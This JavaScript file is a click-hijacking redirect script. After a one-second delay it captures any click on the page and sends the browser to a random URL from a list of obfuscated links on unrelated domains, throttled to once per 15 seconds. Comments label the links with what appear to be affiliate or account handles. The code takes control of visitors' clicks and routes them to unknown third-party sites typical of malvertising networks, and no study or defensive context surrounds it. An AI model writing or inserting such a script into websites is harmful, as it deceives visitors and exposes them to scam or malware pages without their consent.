function init() {
  var arr = [
    // hil: dabao
    "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
    // "https://www.qrcreate.online",

    // hil: db123 
    "https://classic-bonus.com/bY3.VK0OPK3tpYv/bYmQVDJ-Z/DI0/1/MKzqcYy/MQzzATy/LMTSUGz/NNzTIrzDMXDgMm",
    
    // hil: Robert (robertgo)
    "https://few-politics.com/b.3eVz0dPY3_pMvGbBmZVDJGZ/DS0P1ENZDqcR3uO/DzkwwKLCTLU/0PNizgcT4aOTTUEN",
    // hil: Robert (anderson)
    "https://few-politics.com/bR3/V.0DPk3qpvvIbQm-VmJKZrDG0F1DNLDEc/3COCTZA/4RLxTDU/0QNFzCcQ5MMHDbkN",
    
    // hil: BrianLee (leeisok)
    "https://aggravatingoil.com/b/3KVp0/P.3GpGvdb/mHVmJYZIDz0N1mN/Dacr3/MozgUj0RLFTjU/0CNSzOcOz/N/TNUk",
    // hil: BrianLee (brian)
    "https://aggravatingoil.com/b.3KVO0GPl3Mp/vxb/m/V/JqZWDl0y1/N_DLcd3-O/TIMxwYLUTCUc0KN/zTcj5EMgzJEk",

    // mon: lucy
    // "https://phuruxoods.com/4/7683326",
    // "https://whauzavouweb.com/4/7683329",
    // "https://naglelri.net/4/7683327",
    // "https://fouwhigrezi.net/4/7683328",
    "https://boovoogie.net/4/7683330",
    "https://rangauck.com/4/7683319",

    // "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);